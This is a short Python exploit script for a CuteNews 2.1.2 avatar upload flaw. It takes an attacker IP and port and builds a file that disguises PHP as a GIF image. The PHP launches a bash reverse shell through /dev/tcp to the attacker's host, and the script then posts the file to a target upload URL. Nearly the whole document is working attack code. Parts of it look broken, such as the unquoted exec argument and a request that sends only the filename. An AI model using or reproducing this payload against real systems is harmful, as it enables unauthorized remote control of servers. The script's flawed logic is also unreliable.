#                                      #
#     CuteNews 2.1.2 avatar upload     #
#                                      #

import os
import requests
import sys

try:
    url = sys.argv[1] # upload url 
    ip = sys.argv[2] # attacker ip
    port = sys.argv[3] # attacker port 
    filename = sys.argv[4] # name of the file
except:
    print("How to use: \n python3 GifShell.py URL IP PORT FILENAME")
    exit()

bash = "/bin/bash"
shell = (f"GIF89a; \n <?php exec({bash} -c '{bash} -i >& /dev/tcp/{ip}/{port} 0>&1');?>")
gif_file = (f"{filename}.php.gif")
g = open(f"{gif_file}", "w+")
g.write(shell)
g.close()

x = requests.post(url, data = f"{gif_file}")
print(x.status_code)

php_file = (f"{filename}.php")
os.rename(f"{gif_file}",  f"{php_file}")


# i = open(f"{php_file}", "r")
# content = i.read()
# print(content)
